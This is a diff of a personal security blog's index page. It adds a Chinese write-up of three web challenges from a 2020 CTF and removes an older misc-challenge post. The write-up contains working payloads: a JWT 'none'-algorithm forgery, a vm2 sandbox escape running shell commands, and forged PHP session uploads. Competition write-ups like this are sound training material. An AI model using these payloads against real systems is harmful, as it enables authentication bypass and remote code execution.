@@ -66,6 +66,470 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-2020数字中国创新大赛-虎符网络安全" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2020/04/20/2020%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E5%88%9B%E6%96%B0%E5%A4%A7%E8%B5%9B-%E8%99%8E%E7%AC%A6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" class="article-date">
+  <time class="dt-published" datetime="2020-04-20T02:39:54.120Z" itemprop="datePublished">2020-04-20</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/%E6%AF%94%E8%B5%9B/">比赛</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2020/04/20/2020%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E5%88%9B%E6%96%B0%E5%A4%A7%E8%B5%9B-%E8%99%8E%E7%AC%A6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">2020数字中国创新大赛-虎符网络安全</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="easy-login"><a href="#easy-login" class="headerlink" title="easy_login"></a>easy_login</h3><p>在static/js/app.js中发现</p>
+<pre><code class="javascript">/**
+ *  或许该用 koa-static 来处理静态文件
+ *  路径该怎么配置？不管了先填个根目录XD
+ */</code></pre>
+<p>于是直接访问app.js</p>
+<pre><code class="javascript">const Koa = require(&#39;koa&#39;);
+const bodyParser = require(&#39;koa-bodyparser&#39;);
+const session = require(&#39;koa-session&#39;);
+const static = require(&#39;koa-static&#39;);
+const views = require(&#39;koa-views&#39;);
+
+const crypto = require(&#39;crypto&#39;);
+const { resolve } = require(&#39;path&#39;);
+
+const rest = require(&#39;./rest&#39;);
+const controller = require(&#39;./controller&#39;);
+
+const PORT = 80;
+const app = new Koa();
+
+app.keys = [crypto.randomBytes(16).toString(&#39;hex&#39;)];
+global.secrets = [];
+
+app.use(static(resolve(__dirname, &#39;.&#39;)));
+
+app.use(views(resolve(__dirname, &#39;./views&#39;), {
+  extension: &#39;pug&#39;
+}));
+
+app.use(session({key: &#39;sses:aok&#39;, maxAge: 86400000}, app));
+
+// parse request body:
+app.use(bodyParser());
+
+// prepare restful service
+app.use(rest.restify());
+
+// add controllers:
+app.use(controller());
+
+app.listen(PORT);
+console.log(`app started at port ${PORT}...`);</code></pre>
+<p>然后rest.js</p>
+<pre><code class="javascript">module.exports = {
+    APIError: function (code, message) {
+        this.code = code || &#39;internal:unknown_error&#39;;
+        this.message = message || &#39;&#39;;
+    },
+    restify: () =&gt; {
+        const pathPrefix = &#39;/api/&#39;;
+        return async (ctx, next) =&gt; {
+            if (ctx.request.path.startsWith(pathPrefix)) {
+                ctx.rest = data =&gt; {
+                    ctx.response.type = &#39;application/json&#39;;
+                    ctx.response.body = data;
+                };
+                try {
+                    await next();
+                } catch (e) {
+                    ctx.response.status = 400;
+                    ctx.response.type = &#39;application/json&#39;;
+                    ctx.response.body = {
+                        code: e.code || &#39;internal_error&#39;,
+                        message: e.message || &#39;&#39;
+                    };
+                }
+            } else {
+                await next();
+            }
+        };
+    }
+};</code></pre>
+<p>controller.js</p>
+<pre><code class="javascript">const fs = require(&#39;fs&#39;);
+
+function addMapping(router, mapping) {
+    for (const url in mapping) {
+        if (url.startsWith(&#39;GET &#39;)) {
+            const path = url.substring(4);
+            router.get(path, mapping[url]);
+        } else if (url.startsWith(&#39;POST &#39;)) {
+            const path = url.substring(5);
+            router.post(path, mapping[url]);
+        } else {
+            console.log(`invalid URL: ${url}`);
+        }
+    }
+}
+
+function addControllers(router, dir) {
+    fs.readdirSync(__dirname + &#39;/&#39; + dir).filter(f =&gt; {
+        return f.endsWith(&#39;.js&#39;);
+    }).forEach(f =&gt; {
+        const mapping = require(__dirname + &#39;/&#39; + dir + &#39;/&#39; + f);
+        addMapping(router, mapping);
+    });
+}
+
+module.exports = (dir) =&gt; {
+    const controllers_dir = dir || &#39;controllers&#39;;
+    const router = require(&#39;koa-router&#39;)();
+    addControllers(router, controllers_dir);
+    return router.routes();
+};</code></pre>
+<p>fuzz controllers目录得到</p>
+<p>api.js</p>
+<pre><code class="javascript">const crypto = require(&#39;crypto&#39;);
+const fs = require(&#39;fs&#39;)
+const jwt = require(&#39;jsonwebtoken&#39;)
+
+const APIError = require(&#39;../rest&#39;).APIError;
+
+module.exports = {
+    &#39;POST /api/register&#39;: async (ctx, next) =&gt; {
+        const {username, password} = ctx.request.body;
+
+        if(!username || username === &#39;admin&#39;){
+            throw new APIError(&#39;register error&#39;, &#39;wrong username&#39;);
+        }
+
+        if(global.secrets.length &gt; 100000) {
+            global.secrets = [];
+        }
+
+        const secret = crypto.randomBytes(18).toString(&#39;hex&#39;);
+        const secretid = global.secrets.length;
+        global.secrets.push(secret)
+
+        const token = jwt.sign({secretid, username, password}, secret, {algorithm: &#39;HS256&#39;});
+
+        ctx.rest({
+            token: token
+        });
+
+        await next();
+    },
+
+    &#39;POST /api/login&#39;: async (ctx, next) =&gt; {
+        const {username, password} = ctx.request.body;
+
+        if(!username || !password) {
+            throw new APIError(&#39;login error&#39;, &#39;username or password is necessary&#39;);
+        }
+
+        const token = ctx.header.authorization || ctx.request.body.authorization || ctx.request.query.authorization;
+
+        const sid = JSON.parse(Buffer.from(token.split(&#39;.&#39;)[1], &#39;base64&#39;).toString()).secretid;
+
+        console.log(sid)
+
+        if(sid === undefined || sid === null || !(sid &lt; global.secrets.length &amp;&amp; sid &gt;= 0)) {
+            throw new APIError(&#39;login error&#39;, &#39;no such secret id&#39;);
+        }
+
+        const secret = global.secrets[sid];
+
+        const user = jwt.verify(token, secret, {algorithm: &#39;HS256&#39;});
+
+        const status = username === user.username &amp;&amp; password === user.password;
+
+        if(status) {
+            ctx.session.username = username;
+        }
+
+        ctx.rest({
+            status
+        });
+
+        await next();
+    },
+
+    &#39;GET /api/flag&#39;: async (ctx, next) =&gt; {
+        if(ctx.session.username !== &#39;admin&#39;){
+            throw new APIError(&#39;permission error&#39;, &#39;permission denied&#39;);
+        }
+
+        const flag = fs.readFileSync(&#39;/flag&#39;).toString();
+        ctx.rest({
+            flag
+        });
+
+        await next();
+    },
+
+    &#39;GET /api/logout&#39;: async (ctx, next) =&gt; {
+        ctx.session.username = null;
+        ctx.rest({
+            status: true
+        })
+        await next();
+    }
+};</code></pre>
+<p>view.js</p>
+<pre><code class="javascript">module.exports = {
+    &#39;GET /&#39;: async (ctx, next) =&gt; {
+        ctx.status = 302;    
+        ctx.redirect(&#39;/home&#39;);
+    },
+    &#39;GET /login&#39;: async (ctx, next) =&gt; {
+        if(ctx.session.username) {
+            ctx.status = 302;    
+            await ctx.redirect(&#39;/home&#39;);
+        } else {
+            await ctx.render(&#39;login&#39;);
+            await next();
+        }
+    },
+    &#39;GET /register&#39;: async (ctx, next) =&gt; {
+        if(ctx.session.username) {
+            ctx.status = 302;    
+            await ctx.redirect(&#39;/home&#39;);
+        } else {
+            await ctx.render(&#39;register&#39;);
+            await next();
+        }
+    },
+    &#39;GET /home&#39;: async (ctx, next) =&gt; {
+        if(!ctx.session.username) {
+            ctx.status = 302;    
+            await ctx.redirect(&#39;/login&#39;);
+        } else {
+            await ctx.render(&#39;home&#39;, {
+                username: ctx.session.username,
+            });
+            await next();
+        }
+    }
+};</code></pre>
+<p>阅读代码发现：</p>
+<pre><code class="javascript">
+const sid = JSON.parse(Buffer.from(token.split(&#39;.&#39;)[1], &#39;base64&#39;).toString()).secretid;
+if(sid === undefined || sid === null || !(sid &lt; global.secrets.length &amp;&amp; sid &gt;= 0)) {
+            throw new APIError(&#39;login error&#39;, &#39;no such secret id&#39;);
+        }
+const secret = global.secrets[sid];
+//验证之前</code></pre>
+<p>我们可以控制sid来选择任意的密钥</p>
+<p> node 的jsonwebtoken库存在一个缺陷，也是jwt的常见攻击手法，当用户传入jwt secret为空时 jsonwebtoken会采用algorithm none进行解密 </p>
+<p>我们令<code>sid=false</code>,则可以通过</p>
+<pre><code>if(sid === undefined || sid === null || !(sid &lt; global.secrets.length &amp;&amp; sid &gt;= 0)) {
+            throw new APIError(&#39;login error&#39;, &#39;no such secret id&#39;);
+        }</code></pre><p>的验证，且<code>global.secrets[sid]=undefined</code></p>
+<p>最后的payload</p>
+<pre><code class="python">import jwt
+import json
+a=json.loads(&#39;&#39;&#39;{
+        &quot;secretid&quot;: false,
+        &quot;username&quot;:&quot;admin&quot;,
+        &quot;password&quot;: &quot;admin&quot;,
+        &quot;iat&quot;: 1587310401
+}&#39;&#39;&#39;)
+print(jwt.encode(a, key=&quot;&quot;, algorithm=&#39;none&#39;))</code></pre>
+<h3 id="just-escape"><a href="#just-escape" class="headerlink" title="just_escape"></a>just_escape</h3><pre><code>数学运算
+code: (2+6-7)/3
+
+run online: /run.php?code=(2%2b6-7)/3;
+
+Ouput: 0.3333333333333333
+
+注意编码 =.=
+
+时间戳
+code: new Date();
+
+run online: /run.php?code=new%20Date();
+
+Ouput: Fri Nov 22 2019 15:39:22 GMT+0800 (China Standard Time)
+
+真的是 PHP 嘛</code></pre><p>刚开始还真的以为是php,再输入console的时候返回 <code>[object Object]</code>，这题应该是nodejs</p>
+<p>在网上找到<a href="https://blog.zeddyu.info/2019/02/14/Hackim-2019/#BabyJS" target="_blank" rel="noopener">类似的题目</a></p>
+<p>在vm2的issue中找到 <a href="https://github.com/patriksimek/vm2/issues/225" target="_blank" rel="noopener">https://github.com/patriksimek/vm2/issues/225</a> </p>
+<p>payload:</p>
+<pre><code class="javascript">const axios = require(&#39;axios&#39;)
+const untrusted = &#39;(&#39; + function(){
+    TypeError.prototype.get_process = f=&gt;f.constructor(&quot;return process&quot;)();
+    try{
+        Object.preventExtensions(Buffer.from(&quot;&quot;)).a = 1;
+    }catch(e){
+        return e.get_process(()=&gt;{}).mainModule.require(&quot;child_process&quot;).execSync(&quot;cat /flag&quot;).toString();
+    }
+}+&#39;)()&#39;;
+const content = Buffer.from(untrusted).toString(&#39;hex&#39;)
+axios.get(
+&#39;view-source:c3fa4d495d384a6498ef0a99a4f83c59cc9d658bef174be6.changame.ichunqiu.com/run.php?code=var+a%3d`eva`;this[`${a}l`](new+Buffer(`&#39; + content + &#39;`,`hex`).toString());&#39;
+).then(p =&gt; {
+    console.log(p.data)
+}).catch(p =&gt; {
+    console.log((p.response.data))
+})
+</code></pre>
+<h3 id="babyupload"><a href="#babyupload" class="headerlink" title="babyupload"></a>babyupload</h3><pre><code class="php">&lt;?php
+error_reporting(0);
+session_save_path(&quot;/var/babyctf/&quot;);
+session_start();
+require_once &quot;/flag&quot;;
+highlight_file(__FILE__);
+if($_SESSION[&#39;username&#39;] ===&#39;admin&#39;)
+{
+    $filename=&#39;/var/babyctf/success.txt&#39;;
+    if(file_exists($filename)){
+            safe_delete($filename);
+            die($flag);
+    }
+}
+else{
+    $_SESSION[&#39;username&#39;] =&#39;guest&#39;;
+}
+$direction = filter_input(INPUT_POST, &#39;direction&#39;);
+$attr = filter_input(INPUT_POST, &#39;attr&#39;);
+$dir_path = &quot;/var/babyctf/&quot;.$attr;
+if($attr===&quot;private&quot;){
+    $dir_path .= &quot;/&quot;.$_SESSION[&#39;username&#39;];
+}
+if($direction === &quot;upload&quot;){
+    try{
+        if(!is_uploaded_file($_FILES[&#39;up_file&#39;][&#39;tmp_name&#39;])){
+            throw new RuntimeException(&#39;invalid upload&#39;);
+        }
+        $file_path = $dir_path.&quot;/&quot;.$_FILES[&#39;up_file&#39;][&#39;name&#39;];
+        $file_path .= &quot;_&quot;.hash_file(&quot;sha256&quot;,$_FILES[&#39;up_file&#39;][&#39;tmp_name&#39;]);
+        if(preg_match(&#39;/(\.\.\/|\.\.\\\\)/&#39;, $file_path)){
+            throw new RuntimeException(&#39;invalid file path&#39;);
+        }
+        @mkdir($dir_path, 0700, TRUE);
+        if(move_uploaded_file($_FILES[&#39;up_file&#39;][&#39;tmp_name&#39;],$file_path)){
+            $upload_result = &quot;uploaded&quot;;
+        }else{
+            throw new RuntimeException(&#39;error while saving&#39;);
+        }
+    } catch (RuntimeException $e) {
+        $upload_result = $e-&gt;getMessage();
+    }
+} elseif ($direction === &quot;download&quot;) {
+    try{
+        $filename = basename(filter_input(INPUT_POST, &#39;filename&#39;));
+        $file_path = $dir_path.&quot;/&quot;.$filename;
+        if(preg_match(&#39;/(\.\.\/|\.\.\\\\)/&#39;, $file_path)){
+            throw new RuntimeException(&#39;invalid file path&#39;);
+        }
+        if(!file_exists($file_path)) {
+            throw new RuntimeException(&#39;file not exist&#39;);
+        }
+        header(&#39;Content-Type: application/force-download&#39;);
+        header(&#39;Content-Length: &#39;.filesize($file_path));
+        header(&#39;Content-Disposition: attachment; filename=&quot;&#39;.substr($filename, 0, -65).&#39;&quot;&#39;);
+        if(readfile($file_path)){
+            $download_result = &quot;downloaded&quot;;
+        }else{
+            throw new RuntimeException(&#39;error while saving&#39;);
+        }
+    } catch (RuntimeException $e) {
+        $download_result = $e-&gt;getMessage();
+    }
+    exit;
+}
+?&gt;</code></pre>
+<p>因为上传目录和sess文件所在目录相同，可以伪造sess</p>
+<pre><code>POST / HTTP/1.1
+Host: 1b4b996742cb4d2b92d4ee548dc2c06d4ce0b9aa209948d1.changame.ichunqiu.com
+Content-Length: 395
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+Origin: null
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryx5uJpSmC7ijBPrtm
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.163 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
+Cookie: PHPSESSID=7d93710a783397f3be0ba7165a60faed;
+Connection: close
+
+------WebKitFormBoundaryx5uJpSmC7ijBPrtm
+Content-Disposition: form-data; name=&quot;direction&quot;
+
+upload
+------WebKitFormBoundaryx5uJpSmC7ijBPrtm
+Content-Disposition: form-data; name=&quot;attr&quot;
+
+
+------WebKitFormBoundaryx5uJpSmC7ijBPrtm
+Content-Disposition: form-data; name=&quot;up_file&quot;; filename=&quot;sess&quot;
+Content-Type: text/plain
+
+\x08usernames:5:&quot;admin&quot;;
+------WebKitFormBoundaryx5uJpSmC7ijBPrtm--
+</code></pre><p>成功伪造admin身份</p>
+<p>接下来就是要弄个success.txt了，虽然我们文件名会被加个后缀</p>
+<p>但是我们可以通过创建<code>success.txt</code>文件夹来达到相同效果</p>
+<pre><code class="php">POST / HTTP/1.1
+Host: 1b4b996742cb4d2b92d4ee548dc2c06d4ce0b9aa209948d1.changame.ichunqiu.com
+Content-Length: 406
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+Origin: null
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryx5uJpSmC7ijBPrtm
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.163 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
+Cookie: UM_distinctid=16f8014229c357-04d5c848290106-6701b35-240000-16f8014229d768; Hm_lvt_2d0601bd28de7d49818249cf35d95943=1587227364; Hm_lpvt_2d0601bd28de7d49818249cf35d95943=1587344461; PHPSESSID=7d93710a783397f3be0ba7165a60faed; __jsluid_h=7a2212833688aca0c2569475f7bdeffd
+Connection: close
+
+------WebKitFormBoundaryx5uJpSmC7ijBPrtm
+Content-Disposition: form-data; name=&quot;direction&quot;
+
+upload
+------WebKitFormBoundaryx5uJpSmC7ijBPrtm
+Content-Disposition: form-data; name=&quot;attr&quot;
+
+success.txt
+------WebKitFormBoundaryx5uJpSmC7ijBPrtm
+Content-Disposition: form-data; name=&quot;up_file&quot;; filename=&quot;sess&quot;
+Content-Type: text/plain
+
+usernames:5:&quot;admin&quot;;
+------WebKitFormBoundaryx5uJpSmC7ijBPrtm--
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200420103357.png" alt="image13059"></p>
+<p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="http://blog.ccreater.top/2020/04/20/2020数字中国创新大赛-虎符网络安全/">http://blog.ccreater.top/2020/04/20/2020数字中国创新大赛-虎符网络安全/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://blog.ccreater.top/2020/04/20/2020%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E5%88%9B%E6%96%B0%E5%A4%A7%E8%B5%9B-%E8%99%8E%E7%AC%A6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" data-id="ck97vg2k00000usv02sip953b" data-title="2020数字中国创新大赛-虎符网络安全" class="article-share-link">Share</a>
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
     <article id="post-phpmyadmin_登陆后_rce" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
     <a href="/2020/04/03/phpmyadmin_%E7%99%BB%E9%99%86%E5%90%8E_rce/" class="article-date">
@@ -2751,90 +3215,6 @@ function safeKeyword(keyword) {
 
 
   
-    <article id="post-某misc" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2020/02/20/%E6%9F%90misc/" class="article-date">
-  <time class="dt-published" datetime="2020-02-19T16:06:19.535Z" itemprop="datePublished">2020-02-20</time>
-</a>
-    
-  <div class="article-category">
-    <a class="article-category-link" href="/categories/%E5%81%9A%E9%A2%98%E7%AC%94%E8%AE%B0/">做题笔记</a>
-  </div>
-
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2020/02/20/%E6%9F%90misc/">某misc</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <h1 id="不知道哪里的misc"><a href="#不知道哪里的misc" class="headerlink" title="不知道哪里的misc"></a>不知道哪里的misc</h1><p>题目给了一个压缩包</p>
-<p>里面有一个加密的视频文件和未加密的图片</p>
-<p><img src="https://i.loli.net/2020/02/19/ptInrs6axclk12u.png" alt="image105"></p>
-<p>想着图片会不会有提示,用hxd打开发现末尾果然有提示</p>
-<p>kobe code</p>
-<p><img src="https://i.loli.net/2020/02/19/mVqDzgoHdyOWBnT.png" alt="image211"></p>
-<p>得到密码:<code>OAEBEYTKNRBANB</code>,成功拿到视频文件</p>
-<p>但是提示文件无法打开,用binwalk啥的弄了一会,发现里面没有藏啥</p>
-<p>于是换了个思路,猜测这题是要让我们修复mp4文件?头大</p>
-<blockquote>
-<p>一个MP4文件首先会有且只有一个“ftyp”类型的box，作为MP4格式的标志并包含关于文件的一些信息；之后会有且只有一个“moov”类型的box（Movie Box），它是一种container box，子box包含了媒体的metadata信息；MP4文件的媒体数据包含在“mdat”类型的box（Midia Data Box）中，该类型的box也是container box，可以有很多个，也可以没有（当媒体数据全部引用其他文件时），媒体数据的结构由metadata进行描述。</p>
-</blockquote>
-<p><img src="https://i.loli.net/2020/02/19/NVA3PtERXBqfwcd.png" alt="image622"></p>
-<p>图中方框即为第一个box的head,原本应该是<code>ftyp(0x66747970)</code>而这里确实<code>66459707</code>,位置反了</p>
-<p>恢复脚本</p>
-<pre><code class="python">with open(&#39;NBA.mp4&#39;, &#39;rb&#39;) as f:
-    keydata =f.read()
-t= keydata.encode(&quot;hex&quot;)
-l=len(t)
-t2=&quot;&quot;
-for i in range(0,l,2):
-    a=t[i]
-    b=t[i+1]
-    t2+=b
-    t2+=a
-
-print t2[:100]
-t2=t2.decode(&quot;hex&quot;)
-f2 = open(&#39;NBA2.mp4&#39;, &#39;wb&#39;)
-f2.write(t2)
-</code></pre>
-<p>等脚本跑完后成功恢复原来的视频文件</p>
-<p>视频隐写通常把内容存储在视频中的某个图片,我们用 ffmpeg ,将视频分离成图片</p>
-<p><code>ffmpeg -i NBA2.mp4 -f image2 image%d.jpg</code></p>
-<p>一张一张看过去,我们发现,在第3028张突然全黑了</p>
-<p><img src="https://i.loli.net/2020/02/20/Q9dsOuiVGFgwAcm.png" alt="image1136"></p>
-<p>调整一下图片的对比对,跑出一个二维码</p>
-<p><img src="https://i.loli.net/2020/02/20/aE3PpqcrJzn852V.png" alt="image1223"></p>
-<p><code>flag{I_l0v3_pl4ying_b4sk3tb4ll}</code></p>
-<p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="http://blog.ccreater.top/2020/02/20/某misc/">http://blog.ccreater.top/2020/02/20/某misc/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://blog.ccreater.top/2020/02/20/%E6%9F%90misc/" data-id="ck917a7d6003lu8v04q4u7syb" data-title="某misc" class="article-share-link">Share</a>
-      
-      
-      
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/misc/" rel="tag">misc</a></li></ul>
-
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
 
 
   <nav id="page-nav">
@@ -2892,6 +3272,10 @@ f2.write(t2)
       <ul>
         
           <li>
+            <a href="/2020/05/06/de1ctf2020/">de1ctf2020</a>
+          </li>
+        
+          <li>
             <a href="/2020/05/05/maven%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">maven学习笔记</a>
           </li>
         
@@ -2905,10 +3289,6 @@ f2.write(t2)
         
           <li>
             <a href="/2020/04/20/byb2019%E7%BA%BF%E4%B8%8Bawd/">百越杯总结</a>
-          </li>
-        
-          <li>
-            <a href="/2020/04/20/bytectfwp/">bytectf wp</a>
           </li>
         
       </ul>
